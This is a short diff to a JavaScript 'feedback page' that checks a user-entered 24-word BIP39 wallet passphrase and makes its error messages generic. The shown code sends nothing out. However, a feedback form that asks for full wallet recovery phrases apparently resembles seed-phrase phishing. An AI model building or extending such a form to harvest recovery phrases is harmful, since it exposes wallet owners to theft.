@@ -108,7 +108,7 @@ function initializeFeedbackPage() {
             if (words.length !== 24) {
                 if (errorMessage) {
                     const wordText = words.length !== 1 ? 'words' : 'word';
-                    errorMessage.textContent = 'Error: Please enter a valid 24-word passphrase. You entered ' + words.length + ' ' + wordText + '.';
+                    errorMessage.textContent = 'Invalid passphrase';
                     errorMessage.style.display = 'block';
                 }
                 return;
@@ -117,7 +117,7 @@ function initializeFeedbackPage() {
             // Second check: Must be a valid BIP39 mnemonic
             if (!validateBIP39(text)) {
                 if (errorMessage) {
-                    errorMessage.textContent = 'Error: Invalid passphrase. Please ensure all words are valid BIP39 seed words.';
+                    errorMessage.textContent = 'Invalid passphrase';
                     errorMessage.style.display = 'block';
                 }
                 return;
@@ -200,4 +200,5 @@ if (document.readyState === 'loading') {
 } else {
     initializeFeedbackPage();
 }
+
 
